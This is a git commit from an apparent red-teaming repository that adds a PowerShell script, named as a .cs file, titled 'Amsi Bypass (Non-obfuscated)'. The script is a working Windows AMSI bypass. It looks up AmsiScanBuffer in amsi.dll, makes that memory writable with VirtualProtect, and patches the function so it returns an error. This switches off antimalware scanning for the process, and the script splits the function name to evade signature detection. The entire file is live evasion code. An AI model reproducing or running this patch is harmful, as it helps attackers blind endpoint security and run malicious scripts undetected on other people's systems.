4e4778df4edddd36d52aceb15c98ab498ae9e282
H3ll_Ka1ser <98783688+H3llKa1ser@users.noreply.github.com>
2023-12-17 01:57:17 +0200

    Create Amsi Bypass (Non-obfuscated).cs

---
+++ Red Teaming/Evasion Techniques/Amsi Bypass (Non-obfuscated).cs
@@ -0,0 +1,23 @@
+$MethodDefinition = "
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport(`"kernel32`")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+";
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$ABSD = 'AmsiS'+'canBuffer';
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
+[UInt32]$Size = 0x5;
+[UInt32]$ProtectFlag = 0x40;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
+
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
